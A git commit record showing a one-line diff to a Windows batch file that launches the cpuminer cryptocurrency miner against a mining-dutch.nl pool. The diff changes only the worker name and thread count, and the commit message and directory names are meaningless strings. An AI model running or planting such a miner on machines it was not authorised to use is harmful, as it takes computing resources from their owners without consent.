4c29510f87701f46eb789dddd008c0012e6a4a4b
webmrrpro <webmrrpro@gmail.com>
2023-05-14 01:42:21 +0200

    yata
    yata

--- nqnqnqnqnq/zjqshdkjsqdq/1.bat
+++ nqnqnqnqnq/zjqshdkjsqdq/1.bat
@@ -1,1 +1,1 @@
-cpuminer-avx.exe -a yespowerr16 -o stratum+tcp://yespowerr16.mining-dutch.nl:9987 -u mustaman.dseul --timeout 120 -t 8
+cpuminer-avx.exe -a yespowerr16 -o stratum+tcp://yespowerr16.mining-dutch.nl:9987 -u mustaman.dart9cp --timeout 120 -t 9
